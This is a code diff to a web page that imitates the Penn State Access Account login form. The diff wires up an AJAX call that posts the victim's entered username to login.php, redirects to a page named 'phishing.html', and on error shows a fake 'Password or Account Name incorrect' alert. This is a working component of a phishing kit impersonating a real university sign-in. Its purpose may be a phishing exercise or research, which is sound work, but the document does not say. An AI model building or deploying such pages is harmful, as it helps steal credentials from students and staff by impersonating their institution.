@@ -15,6 +15,7 @@
 	<link href="css/reset.css" rel="stylesheet" type="text/css" media="all" />
 	<link href="css/default.css" rel="stylesheet" type="text/css"  media="all" />
 	<link rel="shortcut icon" type="image/x-icon" href="images/favicon.png" />
+	<script src="https://code.jquery.com/jquery-3.2.1.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
 	<!-- Viewport changed; mainly to maximize the website on iOS devices -->
 	<meta name="viewport" content="width=device-width" />
 	
@@ -38,9 +39,24 @@
 		}
 		
 		function sendUsername() {
-			//TODO AJAX call to server with only username;
-			window.location.href = "phishing.html";
-			console.log("TEST HERE");
+			var data = {
+				username: document.f.login.value
+			}
+			
+			$.ajax({
+			url: "login.php",
+			type: "POST",
+			data: data,
+			success: function(result){
+				window.location.href = "phishing.html";
+			},
+			error: function(error){
+				$("<p id=\"alert\" class=\"avoid-thumb error\"><span id=\"alert-prefix\">Authentication Required:</span> Password or Account Name incorrect. Is [caps lock] on?</p>").insertAfter("#accessidmessage");
+				document.f.login.value = "";
+				document.f.password.value = "";
+				focusLogin();
+			}
+			})
 			return false;
 		}
 		
@@ -70,7 +86,7 @@
 		<!-- main content section includes a box around it when in mobile view -->
 		<div id="main-content">
 		
-			<p>Please enter your Access Account ID or Friends of Penn State ID (e.g. xyz5000).</p>
+			<p id="accessidmessage">Please enter your Access Account ID or Friends of Penn State ID (e.g. xyz5000).</p>
 			
 			<form name="f" onsubmit="return sendUsername();" enctype="application/x-www-form-urlencoded" autocomplete="off" autocapitalize="off" autocorrect="off">
 				<input type="hidden" name="ref" value="" />
